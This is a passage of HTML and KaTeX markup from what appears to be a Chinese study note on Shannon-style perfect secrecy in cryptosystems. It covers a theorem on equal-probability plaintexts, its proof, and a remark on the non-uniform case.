C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mrow><mi>k</mi><mo>:</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|{k:x=d_k(y)}|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span><span class="mord">∣</span></span></span></span>均相等。由于此时<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|=|C|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span></span></span></span>,因此对于给定的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>，可将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>分为数量相等（均为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mrow><mi>k</mi><mo>:</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|{k:x=d_k(y_i)}|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mord">∣</span></span></span></span>）的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|C|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span></span></span></span>份，每一份中的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>加密<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>均可得到相同的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，不同份中的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>加密<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>得到不同的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>。因此显然有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mrow><mi>k</mi><mo>:</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mi mathvariant="normal">∣</mi><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∣</mi><mi>K</mi><mi mathvariant="normal">∣</mi></mrow><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">|{k:x=d_k(y)}|=\frac{|K|}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mtight">∣</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><hr /><p><font color=red>定理4：对于密码体制<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>C</mi><mo separator="true">,</mo><mi>K</mi><mo separator="true">,</mo><mi>E</mi><mo separator="true">,</mo><mi>D</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(P,C,K,E,D)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|=|C|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span></span></span></span>，且明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span></span></span></span>等概率选取。当且仅当对于任意<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">x\in P,y\in C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∑</mo><mrow><mi>k</mi><mo>:</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></msub><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\sum_{k:x=d_k(y)}Pr[k]=\frac{1}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.22471em;vertical-align:-0.47471em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22528999999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">:</span><span class="mord mathnormal mtight">x</span><span class="mrel mtight">=</span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47471em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，该密码体制完善保密。</font></p><p>证明：充分性已证明。<br />必要性：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mo>∑</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>k</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>x</mi><mi>j</mi></msub><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac><mo>∑</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>k</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">Pr[y]=\sum Pr[k_i]Pr[x_j]=\frac{1}{|P|}\sum Pr[k_i]=\frac{1}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p><font color=blue>深层理解：这里需要两个条件，一个是明文空间和密文空间元素个数相等，另一个是明文等概率选取。如果明文不等概率会怎样呢？此时必要性就无法成立，那能否举一个不满足此充分条件又能够使结论成立的条件呢？。设第一个条件仍然成立，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的出现的概率为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[x_i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>，此时证明<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[x]=Pr[x|y]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span></span></span></span>。对于给定的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo>∗</mo></msup><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">x^*\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.727796em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math 